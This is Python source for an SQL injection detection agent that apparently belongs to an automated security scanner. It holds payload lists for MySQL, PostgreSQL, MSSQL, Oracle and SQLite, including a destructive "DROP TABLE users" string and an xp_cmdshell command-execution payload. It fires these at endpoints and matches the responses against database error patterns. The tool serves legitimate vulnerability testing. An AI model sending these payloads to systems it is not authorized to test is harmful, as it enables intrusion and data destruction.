"""
SQL Injection Security Agent - Detects SQL injection vulnerabilities.
"""
from typing import List, Dict, Any, Optional
import re
from urllib.parse import urljoin, urlparse, parse_qs

from .base_agent import BaseSecurityAgent, AgentResult
from models.vulnerability import Severity, VulnerabilityType


class SQLInjectionAgent(BaseSecurityAgent):
    """
    SQL Injection testing agent.
    
    Tests for various SQL injection vulnerabilities:
    - Error-based injection
    - Boolean-based blind injection
    - Time-based blind injection
    - UNION-based injection
    """
    
    agent_name = "sql_injection"
    agent_description = "Detects SQL Injection vulnerabilities"
    vulnerability_types = [VulnerabilityType.SQL_INJECTION]
    
    # SQL injection payloads
    ERROR_BASED_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' UNION SELECT NULL--",
        "') OR ('1'='1",
        "'; DROP TABLE users--",
        "1; SELECT * FROM users",
        "' AND '1'='2",
        "admin'--",
        "' OR 1=1--",
        "' OR 'a'='a",
    ]
    
    TIME_BASED_PAYLOADS = [
        "' OR SLEEP(3)--",
        "'; WAITFOR DELAY '0:0:3'--",
        "' OR pg_sleep(3)--",
        "1' AND SLEEP(3)--",
        "1; SELECT SLEEP(3)--",
    ]
    
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT 1,2,3--",
    ]
    
    # Database-specific payloads for targeted testing
    DB_SPECIFIC_PAYLOADS = {
        "MySQL": [
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--",
            "' UNION SELECT NULL,NULL,version()--",
            "' AND 1=IF(1=1,SLEEP(3),0)--",
            "' OR 1=1#",
            "' OR '1'='1'#"
        ],
        "PostgreSQL": [
            "' AND 1=CAST((SELECT version()) AS INT)--",
            "' UNION SELECT NULL,NULL,version()--",
            "' OR pg_sleep(3)--",
            "'; SELECT pg_sleep(3)--",
            "' OR '1'='1'--"
        ],
        "MSSQL": [
            "'; WAITFOR DELAY '0:0:3'--",
            "' AND 1=CONVERT(INT,@@version)--",
            "' UNION SELECT NULL,NULL,@@version--",
            "' OR 1=1--",
            "'; EXEC xp_cmdshell('dir')--"
        ],
        "Oracle": [
            "' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS INT)--",
            "' UNION SELECT NULL,NULL,banner FROM v$version--",
            "' OR '1'='1'--",
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)=1--"
        ],
        "SQLite": [
            "' AND 1=CAST((SELECT sqlite_version()) AS INTEGER)--",
            "' UNION SELECT NULL,NULL,sqlite_version()--",
            "' OR '1'='1'--",
            "' OR 1=1--"
        ]
    }
    
    # SQL error patterns
    SQL_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"valid PostgreSQL result",
        r"Driver.*SQL[\-\_\ ]*Server",
        r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver",
        r"macromedia\.jdbc\.sqlserver",
        r"com\.microsoft\.sqlserver\.jdbc",
        r"Microsoft SQL Native Client",
        r"ODBC SQL Server Driver",
        r"SQLSrv",
        r"SQL Server.*Driver",
        r"\bORA-[0-9]+\b",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"Warning.*ora_",
        r"oracle\.jdbc\.driver",
        r"SQLite\.Exception",
        r"sqlite3\.OperationalError",
        r"SQLITE_ERROR",
        r"SQLite error",
        r"pdo_sqlite",
        r"Access Database Engine",
        r"JET Database Engine",
        r"Access.*ODBC.*Driver",
        r"Sybase message",
        r"Warning.*sybase",
        r"DB2 SQL error",
        r"db2_connect",
        r"db2_exec",
        r"Informix ODBC Driver",
        r"com\.informix\.jdbc",
        r"Dynamic SQL Error",
        r"sql error",
        r"syntax error at or near",
        r"Unclosed quotation mark",
        r"quoted string not properly terminated",
    ]
    
    def __init__(self, **kwargs):
        """Initialize SQL Injection agent."""
        super().__init__(**kwargs)
        self.error_patterns = [re.compile(p, re.IGNORECASE) for p in self.SQL_ERROR_PATTERNS]
    
    async def scan(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        technology_stack: List[str] = None,
        scan_context: Optional[Any] = None
    ) -> List[AgentResult]:
        """
        Scan for SQL injection vulnerabilities with technology-aware payloads.
        
        Args:
            target_url: Target URL
            endpoints: Endpoints to test
            technology_stack: Detected technologies
            scan_context: Shared scan context
            
        Returns:
            List of vulnerabilities found
        """
        results = []
        
        # Detect database type from technology stack
        detected_db = self._detect_database_type(technology_stack or [])
        
        # Select payloads based on detected DB
        payloads_to_use = self._select_payloads(detected_db)
        
        print(f"[SQL Agent] Using {len(payloads_to_use)} payloads (DB: {detected_db or 'generic'})")
        
        for endpoint in endpoints[:5]:  # Limit endpoints for demo
            url = endpoint.get("url", "")
            method = endpoint.get("method", "GET")
            params = endpoint.get("params", {})
            
            # Test error-based injection
            # Test error-based injection
            for param_name in params.keys():
                vuln = await self._test_error_based(
                    url, 
                    method, 
                    params, 
                    param_name, 
                    payloads=payloads_to_use[:10]
                )
                if vuln:
                    results.append(vuln)
                    
                    # Write DB info to context if found
                    if scan_context and detected_db:
                        scan_context.set_database_info(
                            db_type=detected_db,
                            discovered_by="sql_injection"
                        )
                    break
        
        return results
    
    def _detect_database_type(self, technology_stack: List[str]) -> Optional[str]:
        """
        Detect database type from technology stack.
        
        Args:
            technology_stack: List of detected technologies
            
        Returns:
            Database type or None
        """
        tech_lower = [t.lower() for t in technology_stack]
        
        db_indicators = {
            "MySQL": ["mysql", "mariadb"],
            "PostgreSQL": ["postgresql", "postgres", "psql"],
            "MSSQL": ["mssql", "sql server", "microsoft sql"],
            "Oracle": ["oracle", "ora"],
            "SQLite": ["sqlite", "sqlite3"]
        }
        
        for db_type, indicators in db_indicators.items():
            if any(ind in " ".join(tech_lower) for ind in indicators):
                print(f"[SQL Agent] Detected database: {db_type}")
                return db_type
        
        return None
    
    def _select_payloads(self, db_type: Optional[str]) -> List[str]:
        """
        Select appropriate payloads based on database type.
        
        Args:
            db_type: Detected database type
            
        Returns:
            List of payloads to use
        """
        # Start with generic error-based payloads
        payloads = list(self.ERROR_BASED_PAYLOADS)
        
        # Add DB-specific payloads if DB type is known
        if db_type and db_type in self.DB_SPECIFIC_PAYLOADS:
            payloads.extend(self.DB_SPECIFIC_PAYLOADS[db_type])
            print(f"[SQL Agent] Added {len(self.DB_SPECIFIC_PAYLOADS[db_type])} {db_type}-specific payloads")
        
        # Add time-based and union payloads
        payloads.extend(self.TIME_BASED_PAYLOADS[:3])
        payloads.extend(self.UNION_PAYLOADS[:3])
        
        return payloads

    
    async def _test_error_based(
        self,
        url: str,
        method: str,
        params: Dict,
        param_name: str,
        payloads: List[str] = None
    ) -> AgentResult | None:
        """
        Test for error-based SQL injection.
        
        Args:
            url: Target URL
            method: HTTP method
            params: Parameters
            param_name: Parameter to test
            payloads: Optional list of payloads to use
            
        Returns:
            AgentResult if vulnerable, None otherwise
        """
        original_value = params.get(param_name, "")
        
        payloads_to_test = payloads if payloads else self.ERROR_BASED_PAYLOADS
        
        for payload in payloads_to_test:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                if method.upper() == "GET":
                    response = await self.make_request(url, method="GET", params=test_params)
                else:
                    response = await self.make_request(url, method=method, data=test_params)
                
                if response is None:
                    continue
                
                response_text = response.text
                
                # Check for SQL error patterns
                for pattern in self.error_patterns:
                    match = pattern.search(response_text)
                    if match:
                        # Found SQL error - potential vulnerability
                        evidence = match.group(0)
                        
                        # Use AI to analyze
                        ai_analysis = await self.analyze_with_ai(
                            vulnerability_type="SQL Injection (Error-Based)",
                            context=f"Tested parameter '{param_name}' with payload: {payload}",
                            response_data=response_text[:1000]
                        )
                        
                        if ai_analysis.get("is_vulnerable", True):
                            return self.create_result_from_ai(
                                ai_analysis=ai_analysis,
                                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                                severity=Severity.CRITICAL,
                                url=url,
                                parameter=param_name,
                                method=method,
                                title=f"SQL Injection in '{param_name}' parameter",
                                description=f"An error-based SQL injection vulnerability was detected in the '{param_name}' parameter. The application returned a database error when a malicious payload was injected.",
                                evidence=f"SQL Error: {evidence}\nPayload: {payload}",
                                remediation="Use parameterized queries (prepared statements) instead of string concatenation. Never trust user input directly in SQL queries.",
                                owasp_category="A03:2021 – Injection",
                                cwe_id="CWE-89",
                                reference_links=[
                                    "https://owasp.org/Top10/A03_2021-Injection/",
                                    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
                                ],
                                request_data={"params": test_params, "payload": payload},
                                response_snippet=response_text[:500]
                            )
                
            except Exception as e:
                print(f"[SQLi Agent] Error testing {param_name}: {e}")
        
        return None
    
    async def _test_time_based(
        self,
        url: str,
        method: str,
        params: Dict,
        param_name: str
    ) -> AgentResult | None:
        """
        Test for time-based blind SQL injection.
        
        Args:
            url: Target URL
            method: HTTP method
            params: Parameters
            param_name: Parameter to test
            
        Returns:
            AgentResult if vulnerable, None otherwise
        """
        import time
        
        for payload in self.TIME_BASED_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                start_time = time.time()
                
                if method.upper() == "GET":
                    response = await self.make_request(url, method="GET", params=test_params)
                else:
                    response = await self.make_request(url, method=method, data=test_params)
                
                elapsed_time = time.time() - start_time
                
                if response is None:
                    continue
                
                # If response took significantly longer (>2.5 seconds for 3-second sleep)
                if elapsed_time >= 2.5:
                    # Confirm with another request
                    start_time = time.time()
                    if method.upper() == "GET":
                        await self.make_request(url, method="GET", params=params)
                    else:
                        await self.make_request(url, method=method, data=params)
                    normal_time = time.time() - start_time
                    
                    # Original request should be much faster
                    if elapsed_time - normal_time >= 2:
                        return self.create_result(
                            vulnerability_type=VulnerabilityType.SQL_INJECTION,
                            is_vulnerable=True,
                            severity=Severity.CRITICAL,
                            confidence=85,
                            url=url,
                            parameter=param_name,
                            method=method,
                            title=f"Blind SQL Injection (Time-Based) in '{param_name}'",
                            description=f"A time-based blind SQL injection vulnerability was detected. The application response was delayed by approximately {elapsed_time:.1f} seconds when a time-delay payload was injected.",
                            evidence=f"Response delay: {elapsed_time:.1f}s (normal: {normal_time:.1f}s)\nPayload: {payload}",
                            remediation="Use parameterized queries. Implement input validation and sanitization. Use stored procedures where possible.",
                            owasp_category="A03:2021 – Injection",
                            cwe_id="CWE-89",
                            reference_links=[
                                "https://owasp.org/Top10/A03_2021-Injection/",
                                "https://portswigger.net/web-security/sql-injection/blind"
                            ],
                            request_data={"params": test_params, "payload": payload}
                        )
                
            except Exception as e:
                print(f"[SQLi Agent] Time-based test error: {e}")
        
        return None
